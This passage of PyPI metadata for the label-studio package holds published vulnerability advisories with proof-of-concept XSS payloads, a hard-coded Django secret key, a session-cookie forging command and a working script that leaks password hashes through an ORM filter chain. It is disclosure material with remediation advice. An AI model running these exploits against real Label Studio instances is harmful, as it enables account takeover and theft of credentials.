page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.5.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.5.0/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.11)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.5.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"c4df89ee356c4d014e829cfb6b93d93a7986365c460714b107eb0471e4978221","md5":"f2c7ebd6412923f25952873ef2a3619b","sha256":"a8223711d0d298780c4b87055ede5ba12789fcc08f9bc43d02c50281af93d282"},"downloads":-1,"filename":"label_studio-0.5.0-py3-none-any.whl","has_sig":false,"md5_digest":"f2c7ebd6412923f25952873ef2a3619b","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6920417,"upload_time":"2020-03-11T22:35:15","upload_time_iso_8601":"2020-03-11T22:35:15.177321Z","url":"https://files.pythonhosted.org/packages/c4/df/89ee356c4d014e829cfb6b93d93a7986365c460714b107eb0471e4978221/label_studio-0.5.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"3f8c3b8d24c26d289cb4c809d00234dea3e1f75bcc53ed048e57e2bec00d478b","md5":"82f690b596936d9600df50fc156e8f7c","sha256":"022a797fc7f9209fee259a47bb01be3d00807c724f158f46d2e2ea434d750f1d"},"downloads":-1,"filename":"label-studio-0.5.0.tar.gz","has_sig":false,"md5_digest":"82f690b596936d9600df50fc156e8f7c","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6868470,"upload_time":"2020-03-11T22:35:18","upload_time_iso_8601":"2020-03-11T22:35:18.909944Z","url":"https://files.pythonhosted.org/packages/3f/8c/3b8d24c26d289cb4c809d00234dea3e1f75bcc53ed048e57e2bec00d478b/label-studio-0.5.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version 